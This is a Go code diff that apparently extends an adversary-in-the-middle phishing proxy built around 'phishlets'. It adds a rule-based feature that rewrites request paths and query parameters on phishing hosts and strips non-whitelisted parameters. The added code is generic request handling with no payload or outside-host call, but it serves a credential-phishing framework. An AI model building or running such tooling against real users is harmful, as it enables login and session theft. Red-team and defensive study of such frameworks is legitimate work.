@@ -212,6 +212,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
+			if pl != nil {
+	p.applyRewriteUrls(pl, req)
+}
+
 			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
@@ -1527,6 +1531,69 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 	}
 	return body
 }
+
+// --- Begin: rewrite_urls support ---
+func (p *HttpProxy) applyRewriteUrls(pl *Phishlet, req *http.Request) {
+	if pl == nil || len(pl.RewriteUrls) == 0 {
+		return
+	}
+	for _, rule := range pl.RewriteUrls {
+		// Check if the request domain matches any trigger domain
+		domainMatched := false
+		for _, d := range rule.Trigger.Domains {
+			if strings.EqualFold(req.Host, d) {
+				domainMatched = true
+				break
+			}
+		}
+		if !domainMatched {
+			continue
+		}
+		// Check if the request path matches any trigger path
+		pathMatched := false
+		for _, pth := range rule.Trigger.Paths {
+			if strings.HasPrefix(req.URL.Path, pth) {
+				pathMatched = true
+				break
+			}
+		}
+		if !pathMatched {
+			continue
+		}
+		// Rewrite path
+		if rule.Rewrite.Path != "" {
+			req.URL.Path = rule.Rewrite.Path
+		}
+		// Rewrite query
+		if len(rule.Rewrite.Query) > 0 {
+			q := req.URL.Query()
+			// Optionally clear all params except whitelisted
+			if len(rule.WhitelistParams) > 0 {
+				for param := range q {
+					whitelisted := false
+					for _, w := range rule.WhitelistParams {
+						if param == w {
+							whitelisted = true
+							break
+						}
+					}
+					if !whitelisted {
+						q.Del(param)
+					}
+				}
+			}
+			// Set/overwrite params from rule
+			for _, qp := range rule.Rewrite.Query {
+				q.Set(qp.Key, qp.Value)
+			}
+			req.URL.RawQuery = q.Encode()
+		}
+		// Only apply the first matching rule
+		break
+	}
+}
+// --- End: rewrite_urls support ---
+
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
